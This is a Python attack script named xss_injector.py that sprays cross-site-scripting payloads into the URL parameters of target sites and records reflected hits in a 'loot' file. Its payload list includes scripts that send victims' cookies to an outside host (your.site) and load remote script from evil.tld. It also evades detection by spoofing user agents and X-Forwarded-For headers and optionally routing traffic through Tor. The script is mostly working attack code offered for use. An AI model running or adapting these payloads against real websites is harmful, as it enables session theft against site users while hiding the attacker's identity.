#!/usr/bin/env python3
# xss_injector.py

import requests
import time
import random
import urllib.parse as urlparse
import os
from datetime import datetime

payloads = [
    "<script>alert(1)</script>",
    "<img src=x onerror=alert(1)>",
    "<svg/onload=alert(1)>",
    "<script src='https://evil.tld/payload.js'></script>",
    "<script>fetch('https://your.site/?c='+document.cookie)</script>",
    "<script>new Image().src='https://your.site/log?d='+btoa(document.cookie)</script>"
]

dom_fallback_payload = "<script>document.body.innerHTML='<h1>XSS DOM TRIGGERED</h1>'</script>"

user_agents = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) Skipfish/2.10b",
    "sqlmap/1.5.11#dev",
    "Mozilla/5.0 (dirb)",
    "Mozilla/5.0 (XSS-Scanner)",
    "Mozilla/5.0 (Burp Suite)",
    "python-requests/2.26.0",
    "curl/7.83.1",
    "Wget/1.21.1 (linux-gnu)"
]

def get_headers():
    return {
        "User-Agent": random.choice(user_agents),
        "Referer": "https://google.com",
        "X-Forwarded-For": f"127.0.0.{random.randint(1, 255)}"
    }

def session_with_tor(use_tor):
    s = requests.Session()
    if use_tor:
        s.proxies = {
            "http": "socks5h://127.0.0.1:9050",
            "https": "socks5h://127.0.0.1:9050"
        }
    return s

def inject(target_url, session, log, loot, force_dom=False):
    parsed = urlparse.urlparse(target_url)
    base = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"
    params = urlparse.parse_qs(parsed.query)

    if not params:
        print(f"[!] No query params found in: {target_url}")
        return

    param_names = list(params.keys())
    print(f"[+] Injecting into {target_url} → Params: {param_names}")

    previous_responses = {}

    for name in param_names:
        for payload in payloads:
            new_params = params.copy()
            new_params[name] = payload
            query = urlparse.urlencode(new_params, doseq=True)
            test_url = f"{base}?{query}"

            try:
                headers = get_headers()
                r = session.get(test_url, headers=headers, timeout=10)
                body = r.text.strip()

                reflected = payload in body
                is_fake_200 = body in previous_responses.values()
                previous_responses[test_url] = body

                status = f"{test_url} → {r.status_code} | {'[Reflected]' if reflected else 'Not reflected'}"
                if is_fake_200:
                    status += " ⚠️ [Duplicate Response Detected]"
                print(status)

                log.write(status + "\n")
                log.flush()

                if reflected:
                    loot.write(f"{status}\n")
                    loot.flush()

                elif force_dom:
                    print(f"[→] Trying DOM-based fallback...")
                    fallback_url = f"{base}?{urlparse.urlencode({name: dom_fallback_payload})}"
                    dom_status = f"{fallback_url} [DOM PAYLOAD INJECTED]"
                    print(dom_status)
                    loot.write(dom_status + "\n")
                    loot.flush()

            except Exception as e:
                err = f"[!] Error testing {test_url}: {e}"
                print(err)
                log.write(err + "\n")
                log.flush()

            time.sleep(0.5)

def run_injector():
    if not os.path.exists("reports"):
        os.makedirs("reports")
    if not os.path.exists("loot"):
        os.makedirs("loot")

    use_tor = input("Use Tor for requests? (y/n): ").strip().lower().startswith("y")
    session = session_with_tor(use_tor)

    force_dom = input("Force DOM-based payload if no reflection? (y/n): ").strip().lower().startswith("y")

    timestamp = datetime.now().strftime("%Y-%m-%d_%H-%M-%S")
    log_path = f"reports/xss_inject_{timestamp}.txt"
    loot_path = "loot/xss_hits.txt"

    print("\n[1] Inject into a single URL")
    print("[2] Use loot/param_targets.txt from Mini Scanner")
    mode = input("Choose mode: ").strip()

    with open(log_path, "w") as log, open(loot_path, "a") as loot:
        if mode == "1":
            url = input("Enter full URL with param (e.g., https://site/page.php?q=1): ").strip()
            inject(url, session, log, loot, force_dom)
        elif mode == "2":
            loot_file = "loot/param_targets.txt"
            if not os.path.exists(loot_file):
                print(f"[!] Missing {loot_file} – run Mini Scanner first.")
                return
            with open(loot_file) as f:
                targets = [line.strip() for line in f if line.strip()]
                print(f"[+] Loaded {len(targets)} targets.\n")
                for url in targets:
                    inject(url, session, log, loot, force_dom)
        else:
            print("[!] Invalid option. Exiting.")

    print(f"\n[✓] Injection complete.")
    print(f"[✓] Log: {log_path}")
    print(f"[✓] Reflected XSS saved to: {loot_path}")

if __name__ == "__main__":
    run_injector()
